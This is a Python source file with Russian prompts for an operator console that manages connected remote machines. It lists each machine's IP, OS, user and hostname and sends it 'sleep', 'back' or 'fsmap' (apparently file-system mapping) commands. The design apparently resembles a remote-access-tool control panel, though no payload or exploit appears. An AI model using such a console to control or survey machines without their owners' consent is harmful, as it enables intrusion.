import asyncio
from loguru import logger
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout
from services import close_client, close_all_client, client, client_info, fsmap

async def operator_interface(server):
    session = PromptSession()

    while True:
        with patch_stdout():
            selected_str = await session.prompt_async(
                """
Введите ID клиента или команду:
  '0' — выход
  'sleep <id>' — отключить клиента
  'sleep_all' — отключить всех
  'list' — показать подключённых
  >> """
            )

        selected_str = selected_str.strip()

        if selected_str == "0":
            logger.info("[*] Завершение работы. Закрываем соединения...")
            await close_all_client()
            server.close()
            await server.wait_closed()
            logger.info("[*] Сервер завершил работу.")
            break

        elif selected_str == "list":
            if not client_info:
                logger.info("[!] Нет подключённых клиентов.")
            else:
                logger.info("\n[Подключённые клиенты]")
                for cid, info in client_info.items():
                    reader, writer = client[cid]
                    peername = writer.get_extra_info('peername')
                    ip, port = peername if peername else ("?", "?")
                    os_str = info.get("os", "?")
                    user = info.get("user", "?")
                    host = info.get("hostname", "?")
                    arch = info.get("arch", "?")
                    logger.info(f"[{ip}:{port}] ┃ ID {cid} ┃ {os_str} ┃ {user}@{host} ┃ {arch}")
                logger.info("============================================================")

        elif selected_str.startswith("sleep "):
            cid = selected_str[6:].strip()
            if cid in client:
                await close_client(cid)
                logger.info(f"[*] Клиент {cid} отключён.")
            else:
                logger.info("[!] Клиент не найден.")

        elif selected_str == "sleep_all":
            await close_all_client()
            logger.info("[*] Все клиенты отключены.")

        elif selected_str in client:
            cid = selected_str
            logger.info(f"[*] Вход в режим клиента {cid}. Доступные команды: fsmap, sleep, back")
            while True:
                if cid not in client:
                    logger.info(f"[!] Клиент {cid} отключился. Возвращаемся в глобальный режим.")
                    break

                with patch_stdout():
                    cmd = await session.prompt_async(f"[{cid}] client> ")
                cmd = cmd.strip()
                if not cmd:
                    continue

                if cmd == "back":
                    if cid in client:
                        _, writer = client[cid]
                        try:
                            writer.write(b"back\n")  # <-- отправляем клиенту команду
                            await writer.drain()
                            logger.info(f"[*] Команда 'back' отправлена клиенту {cid}.")
                        except Exception as e:
                            logger.info(f"[!] Ошибка при отправке 'back' клиенту {cid}: {e}")
                    logger.info("[*] Возвращаемся в глобальный режим.")
                    break


                if cmd == "sleep":
                    if cid in client:
                        _, writer = client[cid]
                        try:
                            writer.write(b"sleep\n")
                            await writer.drain()
                        except Exception as e:
                            logger.info(f"[!] Не удалось отправить sleep: {e}")
                        await close_client(cid)
                        logger.info(f"[*] Клиент {cid} отключён.")
                    else:
                        logger.info("[!] Клиент уже отсутствует.")
                    break

                if cmd == "fsmap":
                    if cid in client:
                        _, writer = client[cid]
                        try:
                            writer.write(b"fsmap\n")
                            await writer.drain()
                            logger.info(f"[*] Команда 'fsmap' отправлена клиенту {cid}.")
                        except Exception as e:
                            logger.info(f"[!] Ошибка при отправке 'fsmap' клиенту {cid}: {e}")
                    else:
                        logger.info("[!] Клиент отключился прежде чем команда была отправлена.")
                    continue

                logger.info("[!] Неизвестная команда в режиме клиента. Поддерживаемые: fsmap, sleep, back.")